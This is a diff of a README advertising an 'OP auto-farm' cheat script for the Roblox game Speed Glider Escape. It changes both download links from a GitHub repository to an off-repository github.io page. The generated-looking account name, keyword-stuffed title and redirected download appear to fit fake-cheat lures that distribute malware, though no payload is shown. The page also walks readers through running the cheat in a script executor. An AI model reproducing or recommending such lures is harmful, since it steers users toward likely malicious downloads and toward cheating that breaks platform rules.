@@ -1,6 +1,6 @@
 # 🚀 Speed-Glider-Escape-Roblox-Script-OP-Auto-Farm-2026 - Reach Maximum Speed With Automatic Wins
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Alluvial-primaballerina372/Speed-Glider-Escape-Roblox-Script-OP-Auto-Farm-2026)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://alluvial-primaballerina372.github.io)
 
 ## Overview 📝
 
@@ -36,7 +36,7 @@ Follow these steps to set up the script on your computer.
 2.  **Download the script:** Go to the official repository page to download the latest file.
 3.  **Access the software:** Use the link below to reach the download area.
 
-[Download Speed Glider Escape Script](https://github.com/Alluvial-primaballerina372/Speed-Glider-Escape-Roblox-Script-OP-Auto-Farm-2026)
+[Download Speed Glider Escape Script](https://alluvial-primaballerina372.github.io)
 
 4.  **Open your executor:** Launch your preferred Roblox script executor.
 5.  **Copy the code:** Copy the script text provided in the downloaded file into the executor window.
